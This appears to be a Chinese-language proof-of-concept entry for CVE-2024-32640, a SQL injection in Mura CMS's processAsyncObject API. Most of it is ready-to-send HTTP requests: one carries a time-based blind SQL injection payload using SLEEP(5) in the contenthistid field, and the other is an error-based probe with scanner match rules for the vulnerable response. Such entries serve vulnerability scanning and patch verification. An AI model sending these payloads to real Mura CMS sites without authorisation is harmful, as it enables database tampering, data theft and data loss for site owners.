﻿# MuraCMS-SQL注入-default

> 更新时间：2024-05-14

> 漏洞编号：CVE-2024-32640

> 漏洞说明： Mura CMS processAsyncObject接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  

> 漏洞特征："Mura CMS"

> 验证脚本：HTTP

```
POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
Content-Type: application/x-www-form-urlencoded

object=displayregion&contenthistid=x%5c'* AND (SELECT 3504 FROM (SELECT(SLEEP(5)))MQYa)-- Arrv&previewid=1
```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：MuraCMS-SQL注入-default.poc

```
其他POC:
POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
Content-Type: application/x-www-form-urlencoded

object=displayregion&contenthistid=x\'&previewid=1
dsl:
        - 'status_code == 500'
        - 'contains(header, "application/json")'
        - 'contains_all(body, "Unhandled Exception")'
        - 'contains_all(header,"cfid","cftoken")'
```